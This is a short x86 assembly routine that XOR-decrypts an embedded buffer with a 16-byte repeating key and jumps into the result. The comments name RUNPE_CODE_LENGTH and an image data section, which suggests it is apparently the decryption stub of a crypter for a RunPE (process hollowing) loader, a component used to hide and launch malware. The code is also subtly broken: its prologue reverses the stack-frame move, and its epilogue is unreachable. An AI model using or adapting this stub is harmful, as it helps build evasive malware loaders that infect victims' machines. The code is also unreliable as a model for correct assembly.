xor:
	
	; pBuffer
	; pKey

push ebp
mov esp, ebp

xor ebx, ebx
xor ecx, ecx

mov esi, [ebp + 8] ;(IMAGE_BASE + DATA_SECTION_ADDRESS)            	
mov edi, [ebp + 12] ;(IMAGE_BASE + DATA_SECTION_ADDRESS + RUNPE_CODE_LENGTH)
		
.loop:
	cmp ecx, 0x10 
	jl .skipkeyset
	xor ecx, ecx
.skipkeyset:                
	mov al, [edi + ecx]
	xor [esi + ebx], al
	inc ebx
	inc ecx
	cmp ebx, RUNPE_CODE_LENGTH
	jl .loop

mov eax, [ebp + 8]
jmp eax

mov esp, ebp
pop ebp